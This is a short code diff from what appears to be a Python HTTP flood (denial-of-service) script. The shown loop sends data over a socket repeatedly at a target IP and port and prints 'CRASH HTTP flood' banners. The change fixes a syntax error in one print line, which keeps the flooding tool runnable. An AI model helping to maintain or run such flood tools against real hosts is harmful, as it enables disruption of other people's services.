@@ -72,7 +72,7 @@ def run2():
 			for x in range(times):
 				s.send(data)
 			print(i *" \036[4mC R A S H  \033[37mHTTP flood  \033[35m" +(ip)+ " \033[32m" +str(port)+ "\033[0m")
-			print(i *" \036[33mC R A S H  \033[37mHTTP flood  \033[4m" +(ip)+ " \033[37m" +str(times)\033[0m")
+			print(i *" \036[33mC R A S H  \033[37mHTTP flood  \033[4m" +(ip)+ " \033[37m" +str(times)+ "\033[0m")
 		except:
 			s.close()
 			print(i +" \033[1mfinnaly run\033[0m")
